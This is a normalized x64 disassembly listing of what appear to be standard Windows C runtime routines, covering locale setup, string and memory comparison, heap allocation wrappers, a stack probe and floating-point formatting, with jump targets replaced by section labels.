xor eax eax
lea rax [ rsi + 0x80 ]
neg rsi
sbb rdi rdi
and rdi rax
je r-xdata
mov [ rbx + 0x10 ] 0x104
cmp [ rcx ] 0x0
je r-xdata
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
mov ecx [ rbx + 0x24 ]
lea r8 [ rsp + 0x50 ]
mov r9d 0x2
mov edx 0x20001004
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
cmp [ rdi ] 0x0
je r-xdata
call sub_180019aa0
xor ecx ecx
mov edx 0x1
cmp rax 0x3
sete cl
mov [ rbx + 0x1c ] ecx
lea rcx [ sub_180022fcc ]
call [ EnumSystemLocalesA@IAT ]
test [ rbx + 0x10 ] 0x4
jne r-xdata
mov rcx rbx
call sub_1800235dc
cmp [ rax ] 0x0
je r-xdata
mov edi [ rsp + 0x50 ]
test edi edi
jne r-xdata
lea rdx [ r--data ]
mov rcx rdi
call sub_18001d6d0
test eax eax
je r-xdata
cmp [ rbx + 0x10 ] 0x0
je r-xdata
and [ rbx + 0x10 ] 0x0
jmp r-xdata
lea rcx [ r--data ]
mov r8 rbx
mov edx 0x40
call sub_180022ef8
test eax eax
je r-xdata
mov rcx rbx
call sub_180023544
jmp r-xdata
cmp edi 0xfde8
je r-xdata
call [ GetACP@IAT ]
lea rdx [ r--data ]
mov rcx rdi
call sub_18001d6d0
test eax eax
jne r-xdata
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
cmp [ rbx + 0x10 ] 0x0
jne r-xdata
cmp edi 0xfde9
je r-xdata
mov rcx rdi
call sub_180027380
jmp r-xdata
mov ecx [ rbx + 0x24 ]
lea r9d [ rax + 0x2 ]
lea r8 [ rsp + 0x50 ]
mov edx 0x2000000b
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov rcx rbx
call sub_1800235dc
jmp r-xdata
cmp [ rax ] 0x0
je r-xdata
movzx ecx di
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov edi eax
mov edi [ rsp + 0x50 ]
jmp r-xdata
mov rcx rbx
call sub_180023544
jmp r-xdata
mov ecx [ rbx + 0x20 ]
mov edx 0x1
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
test edi edi
je r-xdata
test rbp rbp
je r-xdata
test r12 r12
je r-xdata
movzx eax [ rbx + 0x20 ]
mov [ rbp ] ax
movzx eax [ rbx + 0x24 ]
mov [ rbp + 0x4 ] di
mov [ rbp + 0x2 ] ax
mov eax 0x1
jmp r-xdata
mov eax 0x814
cmp [ rbp ] ax
jne r-xdata
mov rbx [ rsp + 0x58 ]
mov rbp [ rsp + 0x60 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov ecx [ rbx + 0x20 ]
mov r9d 0x40
mov r8 r12
mov edx 0x1001
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
lea r8 [ r--data ]
mov edx 0x40
mov rcx r12
call sub_18001d5ec
test eax eax
je r-xdata
mov ecx [ rbx + 0x24 ]
lea r8 [ r12 + 0x40 ]
mov edx 0x1002
mov r9d 0x40
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001da10
int3
mov r9d 0xa
lea rdx [ r12 + 0x80 ]
mov ecx edi
lea r8d [ r9 + 0x6 ]
call sub_18001b5e8
sub_180023940
sub rdx rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
test cl 0x7
je r-xdata
xor rax rax
retn
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov r9 r8
shr r9 0x3
jne r-xdata
nop
sbb eax eax
sbb eax 0xffffffff
retn
inc rcx
dec r8
jne r-xdata
shr r9 0x2
je r-xdata
inc rcx
dec r8
test cl 0x7
jne r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov rcx [ rcx + rdx ]
bswap rax
bswap rcx
cmp rax rcx
sbb eax eax
sbb eax 0xffffffff
retn
mov rax [ rcx + 0x8 ]
cmp rax [ rdx + rcx + 0x8 ]
jne r-xdata
add rcx 0x8
dec r9
jne r-xdata
add rcx 0x8
mov rax [ rcx + 0x10 ]
cmp rax [ rdx + rcx + 0x10 ]
jne r-xdata
and r8 0x7
jmp r-xdata
add rcx 0x8
mov rax [ rcx + 0x18 ]
cmp rax [ rdx + rcx + 0x18 ]
jne r-xdata
add rcx 0x8
add rcx 0x20
dec r9
jne r-xdata
and r8 0x1f
sub_180023a20
test r8 r8
je r-xdata
xor rax rax
retn
sub rdx rcx
mov r9 rdx
mov r11 0x8101010101010100
test cl 0x7
je r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
mov al [ rcx ]
mov dl [ rcx + r9 ]
inc rcx
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
dec r8
je r-xdata
add rcx 0x8
sub r8 0x8
mov r10 0x7efefefefefefeff
jbe r-xdata
test al al
je r-xdata
xor rax 0xffffffffffffffff
add r10 rdx
xor rax r10
test r11 rax
je r-xdata
test rcx 0x7
jne r-xdata
jmp r-xdata
test dl dl
je r-xdata
xor rax rax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_180023ad8
sub rsp 0x38
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x20 ] rax
mov al [ rdx ]
xor r11d r11d
mov r10 rdx
mov [ rsp ] r11
mov [ rsp + 0x8 ] r11
mov [ rsp + 0x10 ] r11
mov [ rsp + 0x18 ] r11
mov r9 rcx
jmp r-xdata
test al al
jne r-xdata
movzx r8d al
movzx eax al
mov edx 0x1
and eax 0x7
shr r8 0x3
mov cl al
shl dl cl
or [ rsp + r8 ] dl
inc r10
mov al [ r10 ]
jmp r-xdata
mov r8b [ r9 ]
test r8b r8b
jne r-xdata
movzx ecx r8b
movzx eax r8b
mov edx 0x1
and ecx 0x7
shr rax 0x3
shl edx cl
test [ rsp + rax ] dl
jne r-xdata
xor eax eax
mov rax r9
jmp r-xdata
inc r9
mov rcx [ rsp + 0x20 ]
xor rcx rsp
call sub_180018450
add rsp 0x38
retn
sub_180023b94
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx r8
mov rdi rdx
test rcx rcx
je r-xdata
imul rdi rcx
mov eax 0x1
test rdi rdi
cmove rdi rax
xor edx edx
lea rax [ rdx - 0x20 ]
div rcx
cmp rax rdi
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
lea edx [ rax + 0x8 ]
mov r8 rdi
call [ HeapAlloc@IAT ]
test rax rax
jne r-xdata
call sub_1800194ec
mov [ rax ] 0xc
test rbx rbx
je r-xdata
mov rcx rdi
call sub_18001d788
test eax eax
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rbx ] 0xc
xor eax eax
cmp rdi 0xffffffffffffffe0
ja r-xdata
test rbx rbx
je r-xdata
xor eax eax
jmp r-xdata
mov [ rbx ] 0xc
jmp r-xdata
sub_180023c30
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
test rcx rcx
jne r-xdata
test rdx rdx
jne r-xdata
mov rcx rdx
call sub_18001b358
jmp r-xdata
cmp rdx 0xffffffffffffffe0
ja r-xdata
call sub_180018b3c
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_18001d788
call sub_1800194ec
mov [ rax ] 0xc
mov rcx [ rw-data ]
mov eax 0x1
test rbx rbx
cmove rbx rax
mov r8 rdi
xor edx edx
mov r9 rbx
call [ HeapReAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
xor eax eax
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
call sub_1800194ec
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_1800194a4
mov [ rbx ] eax
mov rcx rbx
call sub_18001d788
test eax eax
je r-xdata
call sub_1800194ec
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_1800194a4
mov [ rbx ] eax
jmp r-xdata
cmp rbx 0xffffffffffffffe0
jbe r-xdata
sub_180023d20
sub rsp 0x10
mov [ rsp ] r10
mov [ rsp + 0x8 ] r11
xor r11 r11
lea r10 [ rsp + 0x18 ]
sub r10 rax
cmovb r10 r11
mov r11 [ gs : 0x10 ]
cmp r10 r11
jae r-xdata
mov r10 [ rsp ]
mov r11 [ rsp + 0x8 ]
add rsp 0x10
retn
and r10w 0xf000
lea r11 [ r11 - 0x1000 ]
mov [ r11 ] 0x0
cmp r10 r11
jne r-xdata
sub_180023d70
mov [ rsp + 0x10 ] rsi
push rbp
push rdi
push r12
mov rbp rsp
sub rsp 0x60
movsxd rdi ecx
mov r12d edx
lea rcx [ rbp - 0x20 ]
mov rdx r8
call sub_180018cdc
lea r11d [ rdi + 0x1 ]
cmp r11d 0x100
ja r-xdata
mov esi edi
lea rdx [ rbp - 0x20 ]
sar esi 0x8
movzx ecx sil
call sub_180024c7c
mov edx 0x1
test eax eax
je r-xdata
mov rax [ rbp - 0x20 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + rdi * 2 ]
jmp r-xdata
mov [ rbp + 0x38 ] dil
mov [ rbp + 0x39 ] 0x0
mov r9d edx
mov [ rbp + 0x38 ] sil
mov [ rbp + 0x39 ] dil
mov [ rbp + 0x3a ] 0x0
lea r9d [ rdx + 0x1 ]
jmp r-xdata
and eax r12d
cmp [ rbp - 0x8 ] 0x0
je r-xdata
movzx eax [ rbp + 0x20 ]
cmp [ rbp - 0x8 ] al
je r-xdata
mov rcx [ rbp - 0x20 ]
mov [ rsp + 0x38 ] edx
lea r8 [ rbp + 0x38 ]
mov eax [ rcx + 0x14 ]
mov [ rsp + 0x30 ] eax
mov eax [ rcx + 0x4 ]
lea rcx [ rbp - 0x20 ]
mov [ rsp + 0x28 ] eax
lea rax [ rbp + 0x20 ]
mov [ rsp + 0x20 ] rax
call sub_180020bc0
test eax eax
jne r-xdata
mov rsi [ rsp + 0x88 ]
add rsp 0x60
pop r12
pop rdi
pop rbp
retn
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_180023e70
sub rsp 0x28
mov [ rsp + 0x30 ] rcx
mov [ rsp + 0x38 ] rdx
mov [ rsp + 0x40 ] r8d
mov rdx [ rdx ]
mov rax rcx
call sub_180023f10
call rax
call sub_180023f40
mov rcx rax
mov rdx [ rsp + 0x38 ]
mov rdx [ rdx ]
mov r8d 0x2
call sub_180023f10
add rsp 0x28
retn
sub_180023f44
push rbx
sub rsp 0x40
mov rbx rcx
lea rcx [ rsp + 0x20 ]
call sub_180018cdc
movsx ecx [ rbx ]
call sub_18001d2b0
cmp eax 0x65
je r-xdata
movsx ecx [ rbx ]
call sub_18001d2b0
cmp eax 0x78
jne r-xdata
inc rbx
movzx ecx [ rbx ]
call sub_18001bc48
test eax eax
jne r-xdata
mov rax [ rsp + 0x20 ]
mov dl [ rbx ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov cl [ rax ]
mov [ rbx ] cl
inc rbx
add rbx 0x2
mov al [ rbx ]
mov [ rbx ] dl
mov dl al
mov al [ rbx ]
inc rbx
test al al
jne r-xdata
cmp [ rsp + 0x38 ] al
je r-xdata
add rsp 0x40
pop rbx
retn
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_180023fc4
push rbx
sub rsp 0x40
mov rbx rcx
lea rcx [ rsp + 0x20 ]
call sub_180018cdc
mov r11b [ rbx ]
mov rcx [ rsp + 0x20 ]
test r11b r11b
je r-xdata
mov al [ rbx ]
inc rbx
test al al
je r-xdata
mov rax [ rcx + 0x128 ]
mov rdx [ rax ]
mov al [ rdx ]
cmp [ rsp + 0x38 ] 0x0
je r-xdata
jmp r-xdata
inc rbx
mov r11b [ rbx ]
test r11b r11b
jne r-xdata
add rsp 0x40
pop rbx
retn
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
mov al [ rbx ]
test al al
jne r-xdata
cmp r11b al
je r-xdata
cmp al 0x65
je r-xdata
mov rdx rbx
cmp al 0x45
je r-xdata
dec rbx
cmp [ rbx ] 0x30
je r-xdata
mov rax [ rcx + 0x128 ]
mov rcx [ rax ]
mov al [ rcx ]
cmp [ rbx ] al
jne r-xdata
inc rbx
mov al [ rdx ]
inc rbx
inc rdx
mov [ rbx ] al
test al al
jne r-xdata
dec rbx
sub_18002407c
push rbx
sub rsp 0x30
mov rax r8
mov rbx rdx
mov r8 r9
mov rdx rax
test ecx ecx
je r-xdata
lea rcx [ rsp + 0x40 ]
call sub_180027650
mov r11d [ rsp + 0x40 ]
mov [ rbx ] r11d
lea rcx [ rsp + 0x20 ]
call sub_180027550
mov r11 [ rsp + 0x20 ]
mov [ rbx ] r11
jmp r-xdata
add rsp 0x30
pop rbx
retn
sub_1800240d8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r15
sub rsp 0x50
mov r12 rdx
mov rdx [ rsp + 0xa0 ]
mov rdi rcx
lea rcx [ rax - 0x38 ]
mov r15d r9d
movsxd rbx r8d
call sub_180018cdc
test rdi rdi
jne r-xdata
test r12 r12
jne r-xdata
call sub_1800194ec
lea ebx [ rdi + 0x16 ]
xor eax eax
test ebx ebx
cmovg eax ebx
add eax 0x9
cdqe
cmp r12 rax
ja r-xdata
call sub_1800194ec
lea ebx [ r12 + 0x16 ]
mov [ rax ] ebx
call sub_18001dab4
cmp [ rsp + 0x48 ] r12b
je r-xdata
mov eax ebx
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x98 ] 0x0
mov rsi [ rsp + 0x90 ]
je r-xdata
call sub_1800194ec
mov ebx 0x22
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsi ] 0x2d
mov rdx rdi
jne r-xdata
xor ebp ebp
cmp [ rsi ] 0x2d
sete bpl
xor r13d r13d
add rbp rdi
test ebx ebx
setg r13b
test r13d r13d
je r-xdata
mov [ rax ] ebx
call sub_18001dab4
cmp [ rsp + 0x48 ] 0x0
je r-xdata
test ebx ebx
jle r-xdata
mov [ rdi ] 0x2d
lea rdx [ rdi + 0x1 ]
mov rcx rbp
call sub_180019aa0
movsxd rcx r13d
mov rdx rbp
lea r8 [ rax + 0x1 ]
add rcx rbp
call sub_180018670
xor ecx ecx
lea r8 [ r--data ]
cmp [ rsp + 0x98 ] cl
sete cl
add rbx rdx
add rbx rcx
sub rdi rbx
cmp r12 0xffffffffffffffff
mov rcx rbx
lea rdx [ r12 + rdi ]
cmove rdx r12
call sub_18001d5ec
test eax eax
jne r-xdata
mov al [ rdx + 0x1 ]
mov [ rdx ] al
mov rax [ rsp + 0x30 ]
inc rdx
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov cl [ rax ]
mov [ rdx ] cl
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001da10
int3
lea rcx [ rbx + 0x2 ]
test r15d r15d
je r-xdata
mov rax [ rsi + 0x10 ]
cmp [ rax ] 0x30
je r-xdata
mov [ rbx ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov r8d [ rsi + 0x4 ]
dec r8d
jns r-xdata
cmp [ rsp + 0x48 ] 0x0
je r-xdata
cmp [ rcx ] 0x30
jne r-xdata
cmp r8d 0x64
jl r-xdata
neg r8d
mov [ rbx + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
lea rdx [ rcx + 0x1 ]
mov r8d 0x3
call sub_180018670
cmp r8d 0xa
jl r-xdata
mov eax 0x51eb851f
imul r8d
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
add [ rbx + 0x2 ] dl
imul edx edx 0xffffff9c
add r8d edx
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r15
pop r13
pop r12
retn
add [ rbx + 0x4 ] r8b
mov eax 0x66666667
imul r8d
sar edx 0x2
mov eax edx
shr eax 0x1f
add edx eax
add [ rbx + 0x3 ] dl
imul edx edx 0xfffffff6
add r8d edx
sub_18002430c
push rbx
push rbp
push rsi
push rdi
sub rsp 0x88
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov rcx [ rcx ]
mov rbx r8
mov rdi rdx
mov esi r9d
mov ebp 0x16
lea r8 [ rsp + 0x58 ]
lea rdx [ rsp + 0x40 ]
mov r9d ebp
call sub_1800278e4
test rdi rdi
jne r-xdata
test rbx rbx
je r-xdata
call sub_1800194ec
mov [ rax ] ebp
call sub_18001dab4
mov eax ebp
jmp r-xdata
or rdx 0xffffffffffffffff
cmp rbx rdx
je r-xdata
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_180018450
add rsp 0x88
pop rdi
pop rsi
pop rbp
pop rbx
retn
xor eax eax
cmp [ rsp + 0x40 ] 0x2d
lea r8d [ rsi + 0x1 ]
sete al
xor ecx ecx
test esi esi
setg cl
add rax rdi
lea r9 [ rsp + 0x40 ]
add rcx rax
call sub_180027750
test eax eax
je r-xdata
xor eax eax
cmp [ rsp + 0x40 ] 0x2d
mov rdx rbx
sete al
sub rdx rax
xor eax eax
test esi esi
setg al
sub rdx rax
mov rax [ rsp + 0xd8 ]
mov r9d [ rsp + 0xd0 ]
mov r8d esi
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] rax
call sub_1800240d8
mov [ rdi ] 0x0
jmp r-xdata
sub_180024404
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x50
mov rdi rdx
mov rdx [ rbp + 0x58 ]
mov r14 rcx
lea rcx [ rbp - 0x20 ]
mov r12d r9d
mov rbx r8
mov [ rbp + 0x30 ] 0x3ff
mov r13d 0x30
call sub_180018cdc
xor r15d r15d
test r12d r12d
cmovs r12d r15d
test rdi rdi
jne r-xdata
test rbx rbx
jne r-xdata
call sub_1800194ec
lea ebx [ rdi + 0x16 ]
lea eax [ r12 + 0xb ]
mov [ rdi ] r15b
movsxd rcx eax
cmp rbx rcx
ja r-xdata
call sub_1800194ec
mov ebx 0x16
mov [ rax ] ebx
call sub_18001dab4
cmp [ rbp - 0x8 ] r15b
je r-xdata
mov eax ebx
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rax [ r14 ]
mov ecx 0x7ff
shr rax 0x34
and rax rcx
cmp rax rcx
jne r-xdata
call sub_1800194ec
mov ebx 0x22
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x38 ]
mov rdi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rax 0x8000000000000000
test [ r14 ] rax
je r-xdata
lea r8 [ rbx - 0x2 ]
cmp rbx 0xffffffffffffffff
lea rdx [ rdi + 0x2 ]
mov r9d r12d
mov rcx r14
cmove r8 rbx
mov [ rsp + 0x28 ] r15
mov [ rsp + 0x20 ] r15d
call sub_18002430c
test eax eax
je r-xdata
mov [ rax ] ebx
call sub_18001dab4
cmp [ rbp - 0x8 ] r15b
je r-xdata
mov r9d [ rbp + 0x50 ]
mov r11d 0x30
mov rbx 0xfffffffffffff
mov eax r9d
mov [ rdi ] r11b
neg eax
mov eax r9d
sbb cl cl
and cl 0xe0
add cl 0x78
neg eax
mov rax 0x7ff0000000000000
sbb edx edx
mov [ rdi + 0x1 ] cl
and edx 0xffffffe0
sub edx 0xffffffd9
test [ r14 ] rax
jne r-xdata
mov [ rdi ] 0x2d
inc rdi
cmp [ rdi + 0x2 ] 0x2d
jne r-xdata
mov [ rdi ] r15b
cmp [ rbp - 0x8 ] r15b
je r-xdata
mov [ rdi + 0x2 ] 0x31
add rdi 0x3
mov [ rdi + 0x2 ] r11b
mov rax [ r14 ]
add rdi 0x3
and rax rbx
neg rax
sbb rax rax
and eax 0x3fe
mov [ rbp + 0x30 ] rax
jmp r-xdata
mov ebx [ rbp + 0x50 ]
mov [ rdi ] 0x30
mov edx 0x65
mov eax ebx
neg eax
sbb cl cl
and cl 0xe0
add cl 0x78
mov [ rdi + 0x1 ] cl
lea rcx [ rdi + 0x2 ]
call sub_180027528
test rax rax
je r-xdata
mov [ rdi ] 0x2d
inc rdi
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rax [ rbp - 0x20 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov cl [ rax ]
mov [ r15 ] cl
mov [ r15 ] r10b
jmp r-xdata
mov r15 rdi
xor r10d r10d
inc rdi
test r12d r12d
jne r-xdata
cmp [ rbp - 0x8 ] r15b
jmp r-xdata
neg ebx
sbb cl cl
and cl 0xe0
add cl 0x70
mov [ rax ] cl
mov [ rax + 0x3 ] r15b
test r12d r12d
jle r-xdata
mov r8 0xf000000000000
test [ r14 ] rbx
jbe r-xdata
je r-xdata
cmp [ r15 ] r10b
cmove rdi r15
neg r9d
sbb al al
and al 0xe0
add al 0x70
mov [ rdi ] al
mov rcx [ r14 ]
shr rcx 0x34
and ecx 0x7ff
sub rcx [ rbp + 0x30 ]
js r-xdata
mov r8d r12d
mov dl r11b
mov rcx rdi
mov ebx r12d
call sub_18001d7d0
mov r9d [ rbp + 0x50 ]
add rdi rbx
xor r10d r10d
lea r11d [ r10 + 0x30 ]
test r13w r13w
js r-xdata
mov rax [ r14 ]
mov cl r13b
and rax r8
and rax rbx
shr rax cl
add ax r11w
cmp ax 0x39
jbe r-xdata
xor eax eax
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov [ rdi + 0x1 ] 0x2d
add rdi 0x2
neg rcx
mov [ rdi + 0x1 ] 0x2b
add rdi 0x2
jmp r-xdata
mov rax [ r14 ]
mov cl r13b
and rax r8
and rax rbx
shr rax cl
cmp ax 0x8
jbe r-xdata
mov [ rdi ] al
shr r8 0x4
dec r12d
inc rdi
add r13w 0xfffc
jns r-xdata
add ax dx
cmp rcx 0x64
jl r-xdata
mov rax 0x20c49ba5e353f7cf
imul rcx
sar rdx 0x7
mov rax rdx
shr rax 0x3f
add rdx rax
lea eax [ r11 + rdx ]
imul rdx rdx 0xfffffffffffffc18
mov [ rdi ] al
inc rdi
add rcx rdx
cmp rdi r8
jne r-xdata
mov r8 rdi
mov [ rdi ] r11b
cmp rcx 0x3e8
jl r-xdata
lea rax [ rdi - 0x1 ]
test r12d r12d
jle r-xdata
cmp rdi r8
jne r-xdata
mov rax 0xa3d70a3d70a3d70b
imul rcx
add rdx rcx
sar rdx 0x6
mov rax rdx
shr rax 0x3f
add rdx rax
lea eax [ r11 + rdx ]
imul rdx rdx 0xffffffffffffff9c
mov [ rdi ] al
inc rdi
add rcx rdx
mov [ rax ] r11b
dec rax
jmp r-xdata
cmp [ rax ] 0x46
jne r-xdata
mov rax 0x6666666666666667
imul rcx
sar rdx 0x2
mov rax rdx
shr rax 0x3f
add rdx rax
lea eax [ r11 + rdx ]
imul rdx rdx 0xfffffffffffffff6
mov [ rdi ] al
inc rdi
add rcx rdx
cmp rcx 0xa
jl r-xdata
cmp [ rax ] 0x66
je r-xdata
cmp rax r15
je r-xdata
add cl r11b
cmp [ rbp - 0x8 ] r10b
mov [ rdi ] cl
mov [ rdi + 0x1 ] r10b
inc [ rax - 0x1 ]
mov cl [ rax ]
cmp cl 0x39
jne r-xdata
inc cl
mov [ rax ] cl
jmp r-xdata
add dl 0x3a
mov [ rax ] dl
jmp r-xdata
sub_1800247e4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x40
mov ebx [ r9 + 0x4 ]
mov rsi rdx
mov rdx [ rsp + 0x78 ]
mov rdi rcx
lea rcx [ rax - 0x28 ]
mov r12 r9
dec ebx
mov ebp r8d
call sub_180018cdc
test rdi rdi
jne r-xdata
test rsi rsi
jne r-xdata
call sub_1800194ec
lea ebx [ rdi + 0x16 ]
mov [ rax ] ebx
call sub_18001dab4
cmp [ rsp + 0x38 ] dil
je r-xdata
cmp [ rsp + 0x70 ] 0x0
je r-xdata
call sub_1800194ec
lea ebx [ rsi + 0x16 ]
mov [ rax ] ebx
call sub_18001dab4
cmp [ rsp + 0x38 ] sil
je r-xdata
mov eax ebx
jmp r-xdata
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp [ r12 ] 0x2d
jne r-xdata
cmp ebx ebp
jne r-xdata
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
cmp [ r12 + 0x4 ] 0x0
jg r-xdata
mov [ rdi ] 0x2d
inc rdi
xor eax eax
cmp [ r12 ] 0x2d
movsxd rcx ebx
sete al
add rax rdi
mov [ rcx + rax ] 0x30
movsxd rax [ r12 + 0x4 ]
add rdi rax
mov rcx rdi
call sub_180019aa0
lea rcx [ rdi + 0x1 ]
mov rdx rdi
lea r8 [ rax + 0x1 ]
call sub_180018670
mov [ rdi ] 0x30
inc rdi
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rcx rdi
lea rsi [ rdi + 0x1 ]
call sub_180019aa0
mov rdx rdi
mov rcx rsi
lea r8 [ rax + 0x1 ]
call sub_180018670
mov r11 [ rsp + 0x20 ]
mov rax [ r11 + 0x128 ]
mov rcx [ rax ]
mov al [ rcx ]
mov [ rdi ] al
mov ebx [ r12 + 0x4 ]
test ebx ebx
jns r-xdata
test ebp ebp
jle r-xdata
xor eax eax
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
neg ebx
cmp [ rsp + 0x70 ] 0x0
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov ebx ebp
cmp ebp eax
cmovge ebx eax
movsxd r8 ebx
mov edx 0x30
mov rcx rsi
call sub_18001d7d0
mov rcx rsi
call sub_180019aa0
movsxd rcx ebx
mov rdx rsi
lea r8 [ rax + 0x1 ]
add rcx rsi
call sub_180018670
sub_180024980
push rbx
push rbp
push rsi
push rdi
sub rsp 0x78
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov rcx [ rcx ]
mov rbx r8
mov rdi rdx
mov esi r9d
mov ebp 0x16
lea r8 [ rsp + 0x48 ]
lea rdx [ rsp + 0x30 ]
mov r9d ebp
call sub_1800278e4
test rdi rdi
jne r-xdata
test rbx rbx
je r-xdata
call sub_1800194ec
mov [ rax ] ebp
call sub_18001dab4
mov eax ebp
jmp r-xdata
or rdx 0xffffffffffffffff
cmp rbx rdx
je r-xdata
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_180018450
add rsp 0x78
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov r8d [ rsp + 0x34 ]
xor ecx ecx
lea r9 [ rsp + 0x30 ]
add r8d esi
cmp [ rsp + 0x30 ] 0x2d
sete cl
add rcx rdi
call sub_180027750
test eax eax
je r-xdata
xor eax eax
cmp [ rsp + 0x30 ] 0x2d
mov rdx rbx
sete al
sub rdx rax
mov rax [ rsp + 0xc0 ]
lea r9 [ rsp + 0x30 ]
mov r8d esi
mov [ rsp + 0x28 ] rax
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x20 ] 0x0
call sub_1800247e4
mov [ rdi ] 0x0
jmp r-xdata
sub_180024a54
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov rcx [ rcx ]
mov rdi r8
mov rsi rdx
mov ebp r9d
mov ebx 0x16
lea r8 [ rsp + 0x58 ]
lea rdx [ rsp + 0x40 ]
mov r9d ebx
call sub_1800278e4
test rsi rsi
jne r-xdata
test rdi rdi
je r-xdata
call sub_1800194ec
mov [ rax ] ebx
call sub_18001dab4
mov eax ebx
jmp r-xdata
mov r12d [ rsp + 0x44 ]
xor eax eax
dec r12d
cmp [ rsp + 0x40 ] 0x2d
sete al
